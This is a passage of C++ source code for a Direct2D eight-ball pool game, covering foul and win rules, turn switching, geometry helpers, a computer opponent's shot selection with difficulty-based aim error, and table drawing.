        if (b->type == player1Info.assignedType) p1NewlyPocketed++;
        else if (b->type == player2Info.assignedType) p2NewlyPocketed++;
    }
    if (currentGameState != GAME_OVER) {
        player1Info.ballsPocketedCount += p1NewlyPocketed;
        player2Info.ballsPocketedCount += p2NewlyPocketed;
    }


    // --- Cleanup for next actual shot attempt ---
    pocketedThisTurn.clear();
    // Reset foul tracking flags (done before next shot applied)
    // firstHitBallIdThisShot = -1; // Reset these before next shot call
    // cueHitObjectBallThisShot = false;
    // railHitAfterContact = false;
}

void AssignPlayerBallTypes(BallType firstPocketedType) {
    if (firstPocketedType == BallType::SOLID || firstPocketedType == BallType::STRIPE) {
        if (currentPlayer == 1) {
            player1Info.assignedType = firstPocketedType;
            player2Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
        }
        else {
            player2Info.assignedType = firstPocketedType;
            player1Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
        }
    }
    // If 8-ball was first (illegal on break generally), rules vary.
    // Here, we might ignore assignment until a solid/stripe is pocketed legally.
    // Or assign based on what *else* was pocketed, if anything.
    // Simplification: Assignment only happens on SOLID or STRIPE first pocket.
}

void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
    if (!eightBallPocketed) return; // Only proceed if 8-ball was pocketed

    PlayerInfo& currentPlayerInfo = (currentPlayer == 1) ? player1Info : player2Info;
    bool playerClearedBalls = (currentPlayerInfo.assignedType != BallType::NONE && currentPlayerInfo.ballsPocketedCount >= 7);

    // Loss Conditions:
    // 1. Pocket 8-ball AND scratch (pocket cue ball)
    // 2. Pocket 8-ball before clearing own color group
    if (cueBallPocketed || (!playerClearedBalls && currentPlayerInfo.assignedType != BallType::NONE)) {
        gameOverMessage = (currentPlayer == 1) ? L""Player 2 Wins! (Player 1 fouled on 8-ball)"" : L""Player 1 Wins! (Player 2 fouled on 8-ball)"";
        currentGameState = GAME_OVER;
    }
    // Win Condition:
    // 1. Pocket 8-ball legally after clearing own color group
    else if (playerClearedBalls) {
        gameOverMessage = (currentPlayer == 1) ? L""Player 1 Wins!"" : L""Player 2 Wins!"";
        currentGameState = GAME_OVER;
    }
    // Special case: 8 ball pocketed on break. Usually re-spot or re-rack.
    // Simple: If it happens during assignment phase, treat as foul, respawn 8ball.
    else if (player1Info.assignedType == BallType::NONE) {
        Ball* eightBall = GetBallById(8);
        if (eightBall) {
            eightBall->isPocketed = false;
            // Place 8-ball on foot spot (approx RACK_POS_X) or center if occupied
            eightBall->x = RACK_POS_X;
            eightBall->y = RACK_POS_Y;
            eightBall->vx = eightBall->vy = 0;
            // Check overlap and nudge if necessary (simplified)
        }
        // Apply foul rules if cue ball was also pocketed
        if (cueBallPocketed) {
            foulCommitted = true;
            // Don't switch turns on break scratch + 8ball pocket? Rules vary.
            // Let's make it a foul, switch turns, ball in hand.
            SwitchTurns();
            RespawnCueBall(false); // Ball in hand for opponent
        }
        else {
            // Just respawned 8ball, continue turn or switch based on other balls pocketed.
            // Let ProcessShotResults handle turn logic based on other pocketed balls.
        }
        // Prevent immediate game over message by returning here
        return;
    }


}


void SwitchTurns() {
    currentPlayer = (currentPlayer == 1) ? 2 : 1;
    // Reset aiming state for the new player
    isAiming = false;
    shotPower = 0;
    // Reset foul flag before new turn *really* starts (AI might take over)
    // Foul flag is mainly for display, gets cleared before human/AI shot
    // foulCommitted = false; // Probably better to clear before ApplyShot

    // Set the correct state based on who's turn it is
    if (currentPlayer == 1) {
        currentGameState = PLAYER1_TURN;
        aiTurnPending = false; // Ensure AI flag is off for P1
    }
    else { // Player 2's turn
        if (isPlayer2AI) {
            currentGameState = PLAYER2_TURN; // State indicates it's P2's turn
            aiTurnPending = true;           // Set flag for GameUpdate to trigger AI
            // AI will handle Ball-in-Hand logic if necessary within its decision making
        }
        else {
            currentGameState = PLAYER2_TURN; // Human P2
            aiTurnPending = false;
        }
    }
}

// --- Helper Functions ---

Ball* GetBallById(int id) {
    for (size_t i = 0; i < balls.size(); ++i) {
        if (balls[i].id == id) {
            return &balls[i];
        }
    }
    return nullptr;
}

Ball* GetCueBall() {
    return GetBallById(0);
}

float GetDistance(float x1, float y1, float x2, float y2) {
    return sqrtf(GetDistanceSq(x1, y1, x2, y2));
}

float GetDistanceSq(float x1, float y1, float x2, float y2) {
    float dx = x2 - x1;
    float dy = y2 - y1;
    return dx * dx + dy * dy;
}

bool IsValidCueBallPosition(float x, float y, bool checkHeadstring) {
    // Basic bounds check (inside cushions)
    float left = TABLE_LEFT + CUSHION_THICKNESS + BALL_RADIUS;
    float right = TABLE_RIGHT - CUSHION_THICKNESS - BALL_RADIUS;
    float top = TABLE_TOP + CUSHION_THICKNESS + BALL_RADIUS;
    float bottom = TABLE_BOTTOM - CUSHION_THICKNESS - BALL_RADIUS;

    if (x < left || x > right || y < top || y > bottom) {
        return false;
    }

    // Check headstring restriction if needed
    if (checkHeadstring && x >= HEADSTRING_X) {
        return false;
    }

    // Check overlap with other balls
    for (size_t i = 0; i < balls.size(); ++i) {
        if (balls[i].id != 0 && !balls[i].isPocketed) { // Don't check against itself or pocketed balls
            if (GetDistanceSq(x, y, balls[i].x, balls[i].y) < (BALL_RADIUS * 2.0f) * (BALL_RADIUS * 2.0f)) {
                return false; // Overlapping another ball
            }
        }
    }

    return true;
}


template <typename T>
void SafeRelease(T** ppT) {
    if (*ppT) {
        (*ppT)->Release();
        *ppT = nullptr;
    }
}

// --- Helper Function for Line Segment Intersection ---
// Finds intersection point of line segment P1->P2 and line segment P3->P4
// Returns true if they intersect, false otherwise. Stores intersection point in 'intersection'.
bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection)
{
    float denominator = (p4.y - p3.y) * (p2.x - p1.x) - (p4.x - p3.x) * (p2.y - p1.y);

    // Check if lines are parallel or collinear
    if (fabs(denominator) < 1e-6) {
        return false;
    }

    float ua = ((p4.x - p3.x) * (p1.y - p3.y) - (p4.y - p3.y) * (p1.x - p3.x)) / denominator;
    float ub = ((p2.x - p1.x) * (p1.y - p3.y) - (p2.y - p1.y) * (p1.x - p3.x)) / denominator;

    // Check if intersection point lies on both segments
    if (ua >= 0.0f && ua <= 1.0f && ub >= 0.0f && ub <= 1.0f) {
        intersection.x = p1.x + ua * (p2.x - p1.x);
        intersection.y = p1.y + ua * (p2.y - p1.y);
        return true;
    }

    return false;
}

// --- INSERT NEW HELPER FUNCTION HERE ---
// Calculates the squared distance from point P to the line segment AB.
float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b) {
    float l2 = GetDistanceSq(a.x, a.y, b.x, b.y);
    if (l2 == 0.0f) return GetDistanceSq(p.x, p.y, a.x, a.y); // Segment is a point
    // Consider P projecting onto the line AB infinite line
    // t = [(P-A) . (B-A)] / |B-A|^2
    float t = ((p.x - a.x) * (b.x - a.x) + (p.y - a.y) * (b.y - a.y)) / l2;
    t = std::max(0.0f, std::min(1.0f, t)); // Clamp t to the segment [0, 1]
    // Projection falls on the segment
    D2D1_POINT_2F projection = D2D1::Point2F(a.x + t * (b.x - a.x), a.y + t * (b.y - a.y));
    return GetDistanceSq(p.x, p.y, projection.x, projection.y);
}
// --- End New Helper ---

// --- NEW AI Implementation Functions ---

// Main entry point for AI turn
void AIMakeDecision() {
    Ball* cueBall = GetCueBall();
    if (!cueBall || !isPlayer2AI || currentPlayer != 2) return;

    // Handle Ball-in-Hand placement first if necessary
    if (currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT) {
        AIPlaceCueBall();
        currentGameState = (player1Info.assignedType == BallType::NONE) ? BREAKING : PLAYER2_TURN;
    }

    AIShotInfo bestShot = AIFindBestShot();

    if (bestShot.possible) {
        // --- ACTION: Reset foul flags BEFORE AI applies shot ---
        firstHitBallIdThisShot = -1;
        cueHitObjectBallThisShot = false;
        railHitAfterContact = false;
        // --- End Reset ---

        // Play sound & Apply Shot (Keep this code)
        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
        ApplyShot(bestShot.power, bestShot.angle, 0.0f, 0.0f); // AI doesn't use spin yet

        currentGameState = SHOT_IN_PROGRESS;
        foulCommitted = false; // Reset display flag
        pocketedThisTurn.clear();
    }
    else {
        // --- ACTION: Reset foul flags even for safety shot ---
        firstHitBallIdThisShot = -1;
        cueHitObjectBallThisShot = false;
        railHitAfterContact = false;
        // --- End Reset ---

        // AI couldn't find a shot - Safety tap
        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
        ApplyShot(MAX_SHOT_POWER * 0.1f, 0.0f, 0.0f, 0.0f);
        currentGameState = SHOT_IN_PROGRESS;
        foulCommitted = false;
        pocketedThisTurn.clear();
    }
    aiTurnPending = false;
}

// AI logic for placing cue ball during ball-in-hand
void AIPlaceCueBall() {
    Ball* cueBall = GetCueBall();
    if (!cueBall) return;

    // Simple Strategy: Find the easiest possible shot for the AI's ball type
    // Place the cue ball directly behind that target ball, aiming straight at a pocket.
    // (More advanced: find spot offering multiple options or safety)

    AIShotInfo bestPlacementShot = { false };
    D2D1_POINT_2F bestPlacePos = D2D1::Point2F(HEADSTRING_X * 0.5f, RACK_POS_Y); // Default placement

    BallType targetType = player2Info.assignedType;
    bool canTargetAnyPlacement = false; // Local scope variable for placement logic
    if (targetType == BallType::NONE) {
        canTargetAnyPlacement = true;
    }
    bool target8Ball = (!canTargetAnyPlacement && targetType != BallType::NONE && player2Info.ballsPocketedCount >= 7);
    if (target8Ball) targetType = BallType::EIGHT_BALL;


    for (auto& targetBall : balls) {
        if (targetBall.isPocketed || targetBall.id == 0) continue;

        // Determine if current ball is a valid target for placement consideration
        bool currentBallIsValidTarget = false;
        if (target8Ball && targetBall.id == 8) currentBallIsValidTarget = true;
        else if (canTargetAnyPlacement && targetBall.id != 8) currentBallIsValidTarget = true;
        else if (!canTargetAnyPlacement && !target8Ball && targetBall.type == targetType) currentBallIsValidTarget = true;

        if (!currentBallIsValidTarget) continue; // Skip if not a valid target

        for (int p = 0; p < 6; ++p) {
            // Calculate ideal cue ball position: straight line behind target ball aiming at pocket p
            float targetToPocketX = pocketPositions[p].x - targetBall.x;
            float targetToPocketY = pocketPositions[p].y - targetBall.y;
            float dist = sqrtf(targetToPocketX * targetToPocketX + targetToPocketY * targetToPocketY);
            if (dist < 1.0f) continue; // Avoid division by zero

            float idealAngle = atan2f(targetToPocketY, targetToPocketX);
            // Place cue ball slightly behind target ball along this line
            float placeDist = BALL_RADIUS * 3.0f; // Place a bit behind
            D2D1_POINT_2F potentialPlacePos = D2D1::Point2F( // Use factory function
                targetBall.x - cosf(idealAngle) * placeDist,
                targetBall.y - sinf(idealAngle) * placeDist
            );

            // Check if this placement is valid (on table, behind headstring if break, not overlapping)
            bool behindHeadstringRule = (currentGameState == PRE_BREAK_PLACEMENT);
            if (IsValidCueBallPosition(potentialPlacePos.x, potentialPlacePos.y, behindHeadstringRule)) {
                // Is path from potentialPlacePos to targetBall clear?
                // Use D2D1::Point2F() factory function here
                if (IsPathClear(potentialPlacePos, D2D1::Point2F(targetBall.x, targetBall.y), 0, targetBall.id)) {
                    // Is path from targetBall to pocket clear?
                    // Use D2D1::Point2F() factory function here
                    if (IsPathClear(D2D1::Point2F(targetBall.x, targetBall.y), pocketPositions[p], targetBall.id, -1)) {
                        // This seems like a good potential placement. Score it?
                        // Easy AI: Just take the first valid one found.
                        bestPlacePos = potentialPlacePos;
                        goto placement_found; // Use goto for simplicity in non-OOP structure
                    }
                }
            }
        }
    }

placement_found:
    // Place the cue ball at the best found position (or default if none found)
    cueBall->x = bestPlacePos.x;
    cueBall->y = bestPlacePos.y;
    cueBall->vx = 0;
    cueBall->vy = 0;
}


// AI finds the best shot available on the table
AIShotInfo AIFindBestShot() {
    AIShotInfo bestShotOverall = { false };
    Ball* cueBall = GetCueBall();
    if (!cueBall) return bestShotOverall;

    // Determine target ball type for AI (Player 2)
    BallType targetType = player2Info.assignedType;
    bool canTargetAny = false; // Can AI hit any ball (e.g., after break, before assignment)?
    if (targetType == BallType::NONE) {
        // If colors not assigned, AI aims to pocket *something* (usually lowest numbered ball legally)
        // Or, more simply, treat any ball as a potential target to make *a* pocket
        canTargetAny = true; // Simplification: allow targeting any non-8 ball.
        // A better rule is hit lowest numbered ball first on break follow-up.
    }

    // Check if AI needs to shoot the 8-ball
    bool target8Ball = (!canTargetAny && targetType != BallType::NONE && player2Info.ballsPocketedCount >= 7);


    // Iterate through all potential target balls
    for (auto& potentialTarget : balls) {
        if (potentialTarget.isPocketed || potentialTarget.id == 0) continue; // Skip pocketed and cue ball

        // Check if this ball is a valid target
        bool isValidTarget = false;
        if (target8Ball) {
            isValidTarget = (potentialTarget.id == 8);
        }
        else if (canTargetAny) {
            isValidTarget = (potentialTarget.id != 8); // Can hit any non-8 ball
        }
        else { // Colors assigned, not yet shooting 8-ball
            isValidTarget = (potentialTarget.type == targetType);
        }

        if (!isValidTarget) continue; // Skip if not a valid target for this turn

        // Now, check all pockets for this target ball
        for (int p = 0; p < 6; ++p) {
            AIShotInfo currentShot = EvaluateShot(&potentialTarget, p);
            currentShot.involves8Ball = (potentialTarget.id == 8);

            if (currentShot.possible) {
                // Compare scores to find the best shot
                if (!bestShotOverall.possible || currentShot.score > bestShotOverall.score) {
                    bestShotOverall = currentShot;
                }
            }
        }
    } // End loop through potential target balls

    // If targeting 8-ball and no shot found, or targeting own balls and no shot found,
    // need a safety strategy. Current simple AI just takes best found or taps cue ball.

    return bestShotOverall;
}


// Evaluate a potential shot at a specific target ball towards a specific pocket
AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex) {
    AIShotInfo shotInfo;
    shotInfo.possible = false; // Assume not possible initially
    shotInfo.targetBall = targetBall;
    shotInfo.pocketIndex = pocketIndex;

    Ball* cueBall = GetCueBall();
    if (!cueBall || !targetBall) return shotInfo;

    // --- Define local state variables needed for legality checks ---
    BallType aiAssignedType = player2Info.assignedType;
    bool canTargetAny = (aiAssignedType == BallType::NONE); // Can AI hit any ball?
    bool mustTarget8Ball = (!canTargetAny && aiAssignedType != BallType::NONE && player2Info.ballsPocketedCount >= 7);
    // ---

    // 1. Calculate Ghost Ball position
    shotInfo.ghostBallPos = CalculateGhostBallPos(targetBall, pocketIndex);

    // 2. Calculate Angle from Cue Ball to Ghost Ball
    float dx = shotInfo.ghostBallPos.x - cueBall->x;
    float dy = shotInfo.ghostBallPos.y - cueBall->y;
    if (fabs(dx) < 0.01f && fabs(dy) < 0.01f) return shotInfo; // Avoid aiming at same spot
    shotInfo.angle = atan2f(dy, dx);

    // Basic angle validity check (optional)
    if (!IsValidAIAimAngle(shotInfo.angle)) {
        // Maybe log this or handle edge cases
    }

    // 3. Check Path: Cue Ball -> Ghost Ball Position
    // Use D2D1::Point2F() factory function here
    if (!IsPathClear(D2D1::Point2F(cueBall->x, cueBall->y), shotInfo.ghostBallPos, cueBall->id, targetBall->id)) {
        return shotInfo; // Path blocked
    }

    // 4. Check Path: Target Ball -> Pocket
    // Use D2D1::Point2F() factory function here
    if (!IsPathClear(D2D1::Point2F(targetBall->x, targetBall->y), pocketPositions[pocketIndex], targetBall->id, -1)) {
        return shotInfo; // Path blocked
    }

    // 5. Check First Ball Hit Legality
    float firstHitDistSq = -1.0f;
    // Use D2D1::Point2F() factory function here
    Ball* firstHit = FindFirstHitBall(D2D1::Point2F(cueBall->x, cueBall->y), shotInfo.angle, firstHitDistSq);

    if (!firstHit) {
        return shotInfo; // AI aims but doesn't hit anything? Impossible shot.
    }

    // Check if the first ball hit is the intended target ball
    if (firstHit->id != targetBall->id) {
        // Allow hitting slightly off target if it's very close to ghost ball pos
        float ghostDistSq = GetDistanceSq(shotInfo.ghostBallPos.x, shotInfo.ghostBallPos.y, firstHit->x, firstHit->y);
        // Allow a tolerance roughly half the ball radius squared
        if (ghostDistSq > (BALL_RADIUS * 0.7f) * (BALL_RADIUS * 0.7f)) {
            // First hit is significantly different from the target point.
            // This shot path leads to hitting the wrong ball first.
            return shotInfo; // Foul or unintended shot
        }
        // If first hit is not target, but very close, allow it for now (might still be foul based on type).
    }

    // Check legality of the *first ball actually hit* based on game rules
    if (!canTargetAny) { // Colors are assigned (or should be)
        if (mustTarget8Ball) { // Must hit 8-ball first
            if (firstHit->id != 8) {
                // return shotInfo; // FOUL - Hitting wrong ball when aiming for 8-ball
                // Keep shot possible for now, rely on AIFindBestShot to prioritize legal ones
            }
        }
        else { // Must hit own ball type first
            if (firstHit->type != aiAssignedType && firstHit->id != 8) { // Allow hitting 8-ball if own type blocked? No, standard rules usually require hitting own first.
                // return shotInfo; // FOUL - Hitting opponent ball or 8-ball when shouldn't
                // Keep shot possible for now, rely on AIFindBestShot to prioritize legal ones
            }
            else if (firstHit->id == 8) {
                // return shotInfo; // FOUL - Hitting 8-ball when shouldn't
                // Keep shot possible for now
            }
        }
    }
    // (If canTargetAny is true, hitting any ball except 8 first is legal - assuming not scratching)


    // 6. Calculate Score & Power (Difficulty affects this)
    shotInfo.possible = true; // If we got here, the shot is geometrically possible and likely legal enough for AI to consider

    float cueToGhostDist = GetDistance(cueBall->x, cueBall->y, shotInfo.ghostBallPos.x, shotInfo.ghostBallPos.y);
    float targetToPocketDist = GetDistance(targetBall->x, targetBall->y, pocketPositions[pocketIndex].x, pocketPositions[pocketIndex].y);

    // Simple Score: Shorter shots are better, straighter shots are slightly better.
    float distanceScore = 1000.0f / (1.0f + cueToGhostDist + targetToPocketDist);

    // Angle Score: Calculate cut angle
    // Vector Cue -> Ghost
    float v1x = shotInfo.ghostBallPos.x - cueBall->x;
    float v1y = shotInfo.ghostBallPos.y - cueBall->y;
    // Vector Target -> Pocket
    float v2x = pocketPositions[pocketIndex].x - targetBall->x;
    float v2y = pocketPositions[pocketIndex].y - targetBall->y;
    // Normalize vectors
    float mag1 = sqrtf(v1x * v1x + v1y * v1y);
    float mag2 = sqrtf(v2x * v2x + v2y * v2y);
    float angleScoreFactor = 0.5f; // Default if vectors are zero len
    if (mag1 > 0.1f && mag2 > 0.1f) {
        v1x /= mag1; v1y /= mag1;
        v2x /= mag2; v2y /= mag2;
        // Dot product gives cosine of angle between cue ball path and target ball path
        float dotProduct = v1x * v2x + v1y * v2y;
        // Straighter shot (dot product closer to 1) gets higher score
        angleScoreFactor = (1.0f + dotProduct) / 2.0f; // Map [-1, 1] to [0, 1]
    }
    angleScoreFactor = std::max(0.1f, angleScoreFactor); // Ensure some minimum score factor

    shotInfo.score = distanceScore * angleScoreFactor;

    // Bonus for pocketing 8-ball legally
    if (mustTarget8Ball && targetBall->id == 8) {
        shotInfo.score *= 10.0; // Strongly prefer the winning shot
    }

    // Penalty for difficult cuts? Already partially handled by angleScoreFactor.

    // 7. Calculate Power
    shotInfo.power = CalculateShotPower(cueToGhostDist, targetToPocketDist);

    // 8. Add Inaccuracy based on Difficulty (same as before)
    float angleError = 0.0f;
    float powerErrorFactor = 1.0f;

    switch (aiDifficulty) {
    case EASY:
        angleError = (float)(rand() % 100 - 50) / 1000.0f; // +/- ~3 deg
        powerErrorFactor = 0.8f + (float)(rand() % 40) / 100.0f; // 80-120%
        shotInfo.power *= 0.8f;
        break;
    case MEDIUM:
        angleError = (float)(rand() % 60 - 30) / 1000.0f; // +/- ~1.7 deg
        powerErrorFactor = 0.9f + (float)(rand() % 20) / 100.0f; // 90-110%
        break;
    case HARD:
        angleError = (float)(rand() % 10 - 5) / 1000.0f; // +/- ~0.3 deg
        powerErrorFactor = 0.98f + (float)(rand() % 4) / 100.0f; // 98-102%
        break;
    }
    shotInfo.angle += angleError;
    shotInfo.power *= powerErrorFactor;
    shotInfo.power = std::max(1.0f, std::min(shotInfo.power, MAX_SHOT_POWER)); // Clamp power

    return shotInfo;
}


// Calculates required power (simplified)
float CalculateShotPower(float cueToGhostDist, float targetToPocketDist) {
    // Basic model: Power needed increases with total distance the balls need to travel.
    // Need enough power for cue ball to reach target AND target to reach pocket.
    float totalDist = cueToGhostDist + targetToPocketDist;

    // Map distance to power (needs tuning)
    // Let's say max power is needed for longest possible shot (e.g., corner to corner ~ 1000 units)
    float powerRatio = std::min(1.0f, totalDist / 800.0f); // Normalize based on estimated max distance

    float basePower = MAX_SHOT_POWER * 0.2f; // Minimum power to move balls reliably
    float variablePower = (MAX_SHOT_POWER * 0.8f) * powerRatio; // Scale remaining power range

    // Harder AI could adjust based on desired cue ball travel (more power for draw/follow)
    return std::min(MAX_SHOT_POWER, basePower + variablePower);
}

// Calculate the position the cue ball needs to hit for the target ball to go towards the pocket
D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex) {
    float targetToPocketX = pocketPositions[pocketIndex].x - targetBall->x;
    float targetToPocketY = pocketPositions[pocketIndex].y - targetBall->y;
    float dist = sqrtf(targetToPocketX * targetToPocketX + targetToPocketY * targetToPocketY);

    if (dist < 1.0f) { // Target is basically in the pocket
        // Aim slightly off-center to avoid weird physics? Or directly at center?
        // For simplicity, return a point slightly behind center along the reverse line.
        return D2D1::Point2F(targetBall->x - targetToPocketX * 0.1f, targetBall->y - targetToPocketY * 0.1f);
    }

    // Normalize direction vector from target to pocket
    float nx = targetToPocketX / dist;
    float ny = targetToPocketY / dist;

    // Ghost ball position is diameter distance *behind* the target ball along this line
    float ghostX = targetBall->x - nx * (BALL_RADIUS * 2.0f);
    float ghostY = targetBall->y - ny * (BALL_RADIUS * 2.0f);

    return D2D1::Point2F(ghostX, ghostY);
}

// Checks if line segment is clear of obstructing balls
bool IsPathClear(D2D1_POINT_2F start, D2D1_POINT_2F end, int ignoredBallId1, int ignoredBallId2) {
    float dx = end.x - start.x;
    float dy = end.y - start.y;
    float segmentLenSq = dx * dx + dy * dy;

    if (segmentLenSq < 0.01f) return true; // Start and end are same point

    for (const auto& ball : balls) {
        if (ball.isPocketed) continue;
        if (ball.id == ignoredBallId1) continue;
        if (ball.id == ignoredBallId2) continue;

        // Check distance from ball center to the line segment
        float ballToStartX = ball.x - start.x;
        float ballToStartY = ball.y - start.y;

        // Project ball center onto the line defined by the segment
        float dot = (ballToStartX * dx + ballToStartY * dy) / segmentLenSq;

        D2D1_POINT_2F closestPointOnLine;
        if (dot < 0) { // Closest point is start point
            closestPointOnLine = start;
        }
        else if (dot > 1) { // Closest point is end point
            closestPointOnLine = end;
        }
        else { // Closest point is along the segment
            closestPointOnLine = D2D1::Point2F(start.x + dot * dx, start.y + dot * dy);
        }

        // Check if the closest point is within collision distance (ball radius + path radius)
        if (GetDistanceSq(ball.x, ball.y, closestPointOnLine.x, closestPointOnLine.y) < (BALL_RADIUS * BALL_RADIUS)) {
            // Consider slightly wider path check? Maybe BALL_RADIUS * 1.1f?
            // if (GetDistanceSq(ball.x, ball.y, closestPointOnLine.x, closestPointOnLine.y) < (BALL_RADIUS * 1.1f)*(BALL_RADIUS*1.1f)) {
            return false; // Path is blocked
        }
    }
    return true; // No obstructions found
}

// Finds the first ball hit along a path (simplified)
Ball* FindFirstHitBall(D2D1_POINT_2F start, float angle, float& hitDistSq) {
    Ball* hitBall = nullptr;
    hitDistSq = -1.0f; // Initialize hit distance squared
    float minCollisionDistSq = -1.0f;

    float cosA = cosf(angle);
    float sinA = sinf(angle);

    for (auto& ball : balls) {
        if (ball.isPocketed || ball.id == 0) continue; // Skip cue ball and pocketed

        float dx = ball.x - start.x;
        float dy = ball.y - start.y;

        // Project vector from start->ball onto the aim direction vector
        float dot = dx * cosA + dy * sinA;

        if (dot > 0) { // Ball is generally in front
            // Find closest point on aim line to the ball's center
            float closestPointX = start.x + dot * cosA;
            float closestPointY = start.y + dot * sinA;
            float distSq = GetDistanceSq(ball.x, ball.y, closestPointX, closestPointY);

            // Check if the aim line passes within the ball's radius
            if (distSq < (BALL_RADIUS * BALL_RADIUS)) {
                // Calculate distance from start to the collision point on the ball's circumference
                float backDist = sqrtf(std::max(0.f, BALL_RADIUS * BALL_RADIUS - distSq));
                float collisionDist = dot - backDist; // Distance along aim line to collision

                if (collisionDist > 0) { // Ensure collision is in front
                    float collisionDistSq = collisionDist * collisionDist;
                    if (hitBall == nullptr || collisionDistSq < minCollisionDistSq) {
                        minCollisionDistSq = collisionDistSq;
                        hitBall = &ball; // Found a closer hit ball
                    }
                }
            }
        }
    }
    hitDistSq = minCollisionDistSq; // Return distance squared to the first hit
    return hitBall;
}

// Basic check for reasonable AI aim angles (optional)
bool IsValidAIAimAngle(float angle) {
    // Placeholder - could check for NaN or infinity if calculations go wrong
    return isfinite(angle);
}

// --- Drawing Functions ---

void OnPaint() {
    HRESULT hr = CreateDeviceResources(); // Ensure resources are valid

    if (SUCCEEDED(hr)) {
        pRenderTarget->BeginDraw();
        DrawScene(pRenderTarget); // Pass render target
        hr = pRenderTarget->EndDraw();

        if (hr == D2DERR_RECREATE_TARGET) {
            DiscardDeviceResources();
            // Optionally request another paint message: InvalidateRect(hwndMain, NULL, FALSE);
            // But the timer loop will trigger redraw anyway.
        }
    }
    // If CreateDeviceResources failed, EndDraw might not be called.
    // Consider handling this more robustly if needed.
}

void DrawScene(ID2D1RenderTarget* pRT) {
    if (!pRT) return;

    //pRT->Clear(D2D1::ColorF(D2D1::ColorF::LightGray)); // Background color
    // Set background color to #ffffcd (RGB: 255, 255, 205)
    pRT->Clear(D2D1::ColorF(1.0f, 1.0f, 0.803f)); // Clear with light yellow background

    DrawTable(pRT);
    DrawBalls(pRT);
    DrawAimingAids(pRT); // Includes cue stick if aiming
    DrawUI(pRT);
    DrawPowerMeter(pRT);
    DrawSpinIndicator(pRT);
    DrawPocketedBallsIndicator(pRT);
    DrawBallInHandIndicator(pRT); // Draw cue ball ghost if placing

     // Draw Game Over Message
    if (currentGameState == GAME_OVER && pTextFormat) {
        ID2D1SolidColorBrush* pBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pBrush);
        if (pBrush) {
            D2D1_RECT_F layoutRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP + TABLE_HEIGHT / 2 - 30, TABLE_RIGHT, TABLE_TOP + TABLE_HEIGHT / 2 + 30);
            pRT->DrawText(
                gameOverMessage.c_str(),
                (UINT32)gameOverMessage.length(),
                pTextFormat, // Use large format maybe?
                &layoutRect,
                pBrush
            );
            SafeRelease(&pBrush);
        }
    }

}

void DrawTable(ID2D1RenderTarget* pRT) {
    ID2D1SolidColorBrush* pBrush = nullptr;

    // === Draw Full Orange Frame (Table Border) ===
    ID2D1SolidColorBrush* pFrameBrush = nullptr;
    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pFrameBrush);
    if (pFrameBrush) {
        D2D1_RECT_F outerRect = D2D1::RectF(
            TABLE_LEFT - CUSHION_THICKNESS,
            TABLE_TOP - CUSHION_THICKNESS,
            TABLE_RIGHT + CUSHION_THICKNESS,
            TABLE_BOTTOM + CUSHION_THICKNESS
        );
        pRT->FillRectangle(&outerRect, pFrameBrush);
        SafeRelease(&pFrameBrush);
    }

    // Draw Table Bed (Green Felt)
    pRT->CreateSolidColorBrush(TABLE_COLOR, &pBrush);
    if (!pBrush) return;
    D2D1_RECT_F tableRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP, TABLE_RIGHT, TABLE_BOTTOM);
    pRT->FillRectangle(&tableRect, pBrush);
    SafeRelease(&pBrush);

    // Draw Cushions (Red Border)
    pRT->CreateSolidColorBrush(CUSHION_COLOR, &pBrush);
    if (!pBrush) return;
    // Top Cushion (split by middle pocket)
    pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
    pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
    // Bottom Cushion (split by middle pocket)
    pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
    pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
    // Left Cushion
    pRT->FillRectangle(D2D1::RectF(TABLE_LEFT - CUSHION_THICKNESS, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_LEFT, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
    // Right Cushion
    pRT->FillRectangle(D2D1::RectF(TABLE_RIGHT, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_RIGHT + CUSHION_THICKNESS, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
    SafeRelease(&pBrush);


    // Draw Pockets (Black Circles)
    pRT->CreateSolidColorBrush(POCKET_COLOR, &pBrush);
    if (!pBrush) return;
    for (int i = 0; i < 6; ++i) {
        D2D1_ELLIPSE ellipse = D2D1::Ellipse(pocketPositions[i], HOLE_VISUAL_RADIUS, HOLE_VISUAL_RADIUS);
        pRT->FillEllipse(&ellipse, pBrush);
    }
